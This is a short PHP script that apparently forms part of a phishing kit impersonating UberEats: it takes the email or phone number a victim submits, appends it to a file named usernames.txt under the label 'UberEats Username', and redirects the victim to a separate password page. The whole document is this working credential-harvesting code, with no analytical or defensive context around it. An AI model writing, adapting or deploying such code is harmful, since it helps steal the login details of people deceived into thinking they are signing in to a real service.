<?php
file_put_contents("usernames.txt", "UberEats Username: " . $_POST['Email_or_Phone'] . "\n", FILE_APPEND);
header('Location: pass.html.php');
exit();
?>